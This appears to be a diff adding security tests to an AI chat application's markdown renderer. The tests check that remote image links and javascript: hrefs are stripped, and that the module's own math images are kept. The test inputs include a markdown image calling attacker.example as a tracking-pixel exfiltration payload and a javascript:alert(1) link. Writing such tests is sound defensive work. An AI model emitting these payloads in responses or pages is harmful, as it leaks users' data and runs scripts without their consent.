@@ -116,6 +116,30 @@ def test_delete_key_calls_secret_tool_clear(monkeypatch):
     assert captured["args"][:2] == ["secret-tool", "clear"]
 
 
+def test_remote_image_markdown_syntax_is_stripped(tmp_path):
+    # ![alt](url) is core markdown syntax -- python-markdown turns it into a
+    # real <img> tag during md.convert(), *after* the prose-escaping pass, so
+    # html.escape() never sees it. Qt's Text.RichText auto-fetches <img src>
+    # on render with no user interaction: an attacker-controlled URL in a
+    # model's own response would silently exfiltrate to that URL (a tracking
+    # pixel), violating "no network call the user hasn't configured".
+    html = render_markdown("![leak](http://attacker.example/track.png?x=1)", math_dir=str(tmp_path))
+    assert "attacker.example" not in html
+    assert "<img" not in html
+
+
+def test_own_math_image_is_not_stripped(tmp_path):
+    # the allowlist must still let through the one <img> source this module
+    # itself generates: a file:// path under the given math_dir.
+    html = render_markdown("Math: $E = mc^2$", math_dir=str(tmp_path))
+    assert f'<img src="file://{tmp_path}' in html
+
+
+def test_javascript_link_href_is_neutralized(tmp_path):
+    html = render_markdown("[click me](javascript:alert(1))", math_dir=str(tmp_path))
+    assert "javascript:" not in html
+
+
 def test_openai_compatible_hits_custom_url_without_requiring_a_key(monkeypatch):
     import ai_chat, requests as req
 
